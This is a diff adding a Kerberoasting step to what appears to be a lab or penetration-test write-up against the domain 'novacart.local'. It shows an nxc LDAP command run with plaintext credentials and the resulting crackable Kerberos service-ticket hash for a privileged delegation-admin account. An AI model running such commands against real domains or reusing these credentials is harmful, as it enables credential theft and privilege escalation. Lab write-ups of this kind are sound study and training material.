@@ -337,5 +337,25 @@ SMB         10.0.18.23      445    DC               [*] Writing 30 local users t
 ```
 Ill dump all the users here
 
+# Kerberoasting
+
+Now i have valid credentials i can try kerberoasting
+
+Also worth noting asrep roasting also failed
+
+```python
+nxc ldap dc.novacart.local -u j.paul -p 'password123' --kerberoasting kerb.hashes
+LDAP        10.0.18.23      389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:novacart.local) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.0.18.23      389    DC               [+] novacart.local\j.paul:password123 
+LDAP        10.0.18.23      389    DC               [*] Skipping disabled account: krbtgt
+LDAP        10.0.18.23      389    DC               [*] Total of records returned 1
+LDAP        10.0.18.23      389    DC               [*] sAMAccountName: m.brown, memberOf: CN=Service Delegation Admins,CN=Users,DC=novacart,DC=local, pwdLastSet: 2026-03-08 18:03:23.807148, lastLogon: 2026-03-14 17:09:53.841255
+LDAP        10.0.18.23      389    DC               $krb5tgs$23$*m.brown$NOVACART.LOCAL$novacart.local\m.brown*$b0a3c0d663e8bc139d8f2b1a6549c414$bc4e67ad85d6ef76fddf19cd55053c0d9270d568d95d84d1c72abc2486ba988c3859376f4cf41e56caf8ff29a984f85c943cf467f03194647f917b8e464a11ef2b5e2cfb9de0b30216cbc2cca7670aa561d48711ea486b0b65a27d18dd0765c9b8a43903c3afd9e75ebe3c0a09231ff616be74a57daeb08b31f2faafca653aac30b0ceb58fd26fabb27aa9a0fbabf724f27526f51e99143162061b0fa1c0f0d8b0247d2a18d27e803ce5726a76c6abe6868e46da51033e77ce4491d1e9b140618932f8db92c02f34cbd608c6d717ceb605a4543a75722eb7ed4f304fe7a58ee5e7e8e5d1faea236a73ac169f2f90efec2c280a639bbd0e58b26d3cc3eba1181680a04b5237522511c81947efb240df3dd8c147cf2cce3926988b0b51c086a989fb82f750af3a532f61029d076842e6e1ad9c9e8381204470a1e9a9d3c6e348d6e06cb41dfec91d3751d7b9e15acbe8386413ad71b743285f51d98043ee3d8cb16ee3ff840e56a0a5cf98d9299c1d856c67b89865d7f08ca2ad31bd539bf64e293d2d0ec509cefef5d0084212082c0407333f14559a183f1ad22628e51958be74617fc453516be24f3af0d061114c110b9a04c7db1fb34f983e830681a52181f449d470a2d1e52fab5579ca09418d4fef10d3234776aa7b77b390c6ee15a3901f82e8898213ec1fd714730976db187fac1fa93491d064aab91e4dbdd162d7a3b2389306b8357578b842a97a45a23acd55602239d9b56e50e06657a2b460abdff2f929b14a2b6e5a578657086b9c81eb97c7f3c409ad3c428f0f4afcc266b8f0cef4dc39134476dd796b5d215f4acd734a9c7b477b5b30477886ee1ec3c4288f5cc198a24fb0c0c4e0bc1ea69bce4fb564a0bee5154aaa768e44d067e71318ccc82e74ccf2385e3edcc6e2defc92128a2b33e45b8964891e2b049c08bfe3798e7f45615a7271ce2e6cc9b1d279067f13202c04d1d6ca435fbfb9d32e3bb5dc9625a64665c54248a465cc9d78d96055b65fbd25cd05ab8d470f5deb2676841d8e919551725d5eeb7e382ec0e24d749e34cde427660630ac67bab858584eb9939f8847d63a00cb0acaca26c330d9dde9d691411c503d8a5ae231cdcb5f75843114b60f0120fa80695541184a31047034185bbd4ea9ea359b3a41c3cd2cc448fe3cd12ffde34210c1d59c85816beae1866c0f5e7a61a1441d5fb4fc29c8bb3d8e1205c79ebffefa453ff9f428658ac985455d43225843ff4c6e9a7592831d5e786a1aab31f6ee8abafd4f36f3753ee5f60f94ecf8c42e22b074a2559cf7f217849539287ed8cd9d7f3f51b6fc815d8af23e6a86bcb43c4bdbd8f21b52efe047adc3f5defcd6192695acbef9e82da424ed650af5036f486a23a936ecc1094f003792e5e4044aa79c787e51c933522b276a2e7c07a9706eed5610a47c1ac6fb9fdee88801c0c82029
+```
+
+Looks like ive got a hash
 
 
+```python
+
+```
